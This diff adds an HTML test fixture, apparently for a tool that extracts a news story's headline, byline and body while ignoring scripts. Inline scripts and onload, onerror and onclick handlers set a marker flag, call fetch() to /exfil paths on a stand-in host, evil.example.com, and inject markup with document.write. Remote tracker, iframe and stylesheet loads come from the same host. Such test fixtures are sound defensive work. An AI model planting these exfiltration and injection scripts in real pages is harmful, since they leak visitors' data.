@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script>globalThis.__storyExtractScriptRan = true; fetch('https://evil.example.com/exfil');</script>
+  <script src="https://evil.example.com/tracker.js"></script>
+</head>
+<body onload="globalThis.__storyExtractScriptRan = true; fetch('https://evil.example.com/exfil-onload')">
+  <img src="https://evil.example.com/pixel.gif" onerror="globalThis.__storyExtractScriptRan = true">
+  <iframe src="https://evil.example.com/frame"></iframe>
+  <link rel="stylesheet" href="https://evil.example.com/style.css">
+  <article>
+    <h1 class="headline" onclick="globalThis.__storyExtractScriptRan = true">Story headline survives the noise</h1>
+    <p class="byline">By Script Heavy</p>
+    <div class="body">
+      <p>Body text next to a script tag.</p>
+      <script>document.write('<p>injected</p>'); fetch('https://evil.example.com/exfil-inline');</script>
+    </div>
+  </article>
+  <script>globalThis.__storyExtractScriptRan = true;</script>
+</body>
+</html>
